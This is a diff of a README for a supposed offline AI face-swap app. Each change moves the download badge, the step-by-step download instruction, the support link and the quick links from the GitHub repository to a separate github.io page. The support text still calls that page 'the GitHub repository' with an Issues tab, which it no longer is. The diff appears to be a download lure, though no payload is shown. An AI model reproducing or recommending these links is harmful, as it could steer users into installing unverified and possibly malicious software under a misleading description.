@@ -1,6 +1,6 @@
 # 🤖 ai-face-swap-2026 - Swap Faces Instantly, Completely Offline
 
-[![Download Now](https://img.shields.io/badge/Download-ai--face--swap--2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/refsitemaroc/ai-face-swap-2026)
+[![Download Now](https://img.shields.io/badge/Download-ai--face--swap--2026-2ea44f?style=for-the-badge&logo=github)](https://refsitemaroc.github.io)
 
 ---
 
@@ -61,7 +61,7 @@ Choose the model that fits your hardware and quality requirements:
 ### 📥 Download & Install
 
 **Step 1:** Visit this link to download the application:  
-[**https://github.com/refsitemaroc/ai-face-swap-2026**](https://github.com/refsitemaroc/ai-face-swap-2026)
+[**https://refsitemaroc.github.io**](https://refsitemaroc.github.io)
 
 **Step 2:** Look for the download button on that page. Click it to save the file to your computer.
 
@@ -181,7 +181,7 @@ Yes, it can swap multiple faces in a single photo. Select which face to swap, or
 
 If you encounter any issues or have feature suggestions, please:
 
-1. Visit the GitHub repository: [https://github.com/refsitemaroc/ai-face-swap-2026](https://github.com/refsitemaroc/ai-face-swap-2026)
+1. Visit the GitHub repository: [https://refsitemaroc.github.io](https://refsitemaroc.github.io)
 2. Open an "Issue" in the Issues tab
 3. Describe your problem clearly and include any error messages
 
@@ -191,7 +191,7 @@ We appreciate community feedback and regularly update the tool based on user req
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/refsitemaroc/ai-face-swap-2026](https://github.com/refsitemaroc/ai-face-swap-2026)
+- **Download:** [https://refsitemaroc.github.io](https://refsitemaroc.github.io)
 - **Documentation:** Included in the application's Help menu
 - **Changelog:** Available on the GitHub releases page
 
